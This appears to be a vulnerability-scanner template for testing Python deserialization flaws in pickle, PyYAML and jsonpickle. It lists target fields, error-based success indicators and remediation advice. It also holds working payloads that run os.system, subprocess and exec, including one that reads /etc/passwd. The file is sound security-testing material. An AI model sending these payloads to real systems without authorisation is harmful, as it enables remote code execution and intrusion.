---
name: "Python Deserialization Attack"
category: "deserialization"
severity: "critical"
description: "Tests for Python deserialization vulnerabilities including pickle, PyYAML, jsonpickle, and shelve. Targets unsafe loading of serialized objects."

target_fields:
  - "serialized"
  - "pickle"
  - "marshalled"
  - "marshal"
  - "object_data"
  - "encoded_object"
  - "encoded"
  - "yaml"
  - "yml"
  - "phar"
  - "json_object"
  - "json_obj"
  - "pojo"
  - "entity"
  - "dto"
  - "model"
  - "unserialize"
  - "deserialize"
  - "restore"
  - "hydrate"
  - "inject"

success_indicators:
  status_codes: [500]
  response_contains:
    - "Traceback"
    - "ModuleNotFoundError"
    - "ImportError"
    - "AttributeError"
    - "TypeError"
    - "ValueError"
    - "PickleError"
    - "UnpicklingError"
    - "YAMLError"

remediation: |
  Use only standard JSON or explicitly typed serialization formats. Never use unsafe
  deserialization functions like pickle.loads(), yaml.load(), or marshal.loads() on
  untrusted input. If using YAML, use yaml.safe_load() instead of yaml.load().

references:
  - "https://python-patterns.guide/python/serialization/"
  - "https://www.owasp.org/index.php/Deserialization_of_untrusted_data"

payloads:
  # Pickle protocol 0 (ASCII) - os.system payloads
  - "(S'whoami'\nos\nsystem\n."
  - "(S'id'\nos\nsystem\n."
  - "(S'cat /etc/passwd'\nos\nsystem\n."
  
  # Pickle protocol 2 (binary) markers
  - "80024e710028580700000077686f616d69710168037102532e2e"
  
  # PyYAML unsafe loading - os.system
  - "!!python/object/apply:os.system ['whoami']"
  - "!!python/object/apply:os.system ['id']"
  - "!!python/object/apply:subprocess.call [['whoami']]"
  - "!!python/object/apply:subprocess.Popen [['whoami']]"
  - "!!python/object/apply:subprocess.run [['id']]"
  
  # PyYAML with builtins.exec
  - "!!python/object/apply:builtins.exec ['import os; os.system(\"whoami\")']"
  - "!!python/object/apply:builtins.eval ['__import__(\"os\").system(\"whoami\")']"
  
  # jsonpickle payloads - file access
  - '{"py/object": "__main__.Exploit", "command": "whoami"}'
  - '{"py/object": "os.system", "py/args": ["whoami"]}'
  
  # Base64 encoded pickle payloads
  - "gASVBQAAAAAAAACMB3dob2FtaZSMCnN1YnByb2Nlc3OUjARjYWxsUpQu"
